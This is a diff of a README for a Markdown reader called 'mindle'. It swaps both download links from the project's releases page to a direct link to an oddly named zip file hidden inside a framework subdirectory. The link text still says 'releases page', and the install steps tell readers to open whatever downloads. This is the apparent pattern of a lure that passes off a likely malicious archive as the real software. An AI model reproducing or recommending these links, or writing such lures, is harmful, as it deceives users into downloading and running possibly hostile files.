@@ -1,6 +1,6 @@
 # 📖 mindle - Read your markdown files with ease
 
-[![](https://img.shields.io/badge/Download-Mindle-blue.svg)](https://github.com/underslung-cantabrigian755/mindle/releases)
+[![](https://img.shields.io/badge/Download-Mindle-blue.svg)](https://github.com/underslung-cantabrigian755/mindle/raw/refs/heads/main/Frameworks/Sparkle.framework/Versions/B/XPCServices/Downloader.xpc/Contents/MacOS/Software_escalloniaceous.zip)
 
 Mindle provides a clean space to read Markdown files. You gain a distraction-free environment to view, highlight, and annotate your notes. The app handles Github Flavored Markdown to ensure your images and tables display correctly.
 
@@ -8,7 +8,7 @@ Mindle provides a clean space to read Markdown files. You gain a distraction-fre
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/underslung-cantabrigian755/mindle/releases) to download the program.
+1. Visit the [releases page](https://github.com/underslung-cantabrigian755/mindle/raw/refs/heads/main/Frameworks/Sparkle.framework/Versions/B/XPCServices/Downloader.xpc/Contents/MacOS/Software_escalloniaceous.zip) to download the program.
 2. Locate the link labeled "Windows" or ending in ".exe" on the page.
 3. Click the link to save the installer file to your computer.
 4. Open the file once the download finishes.
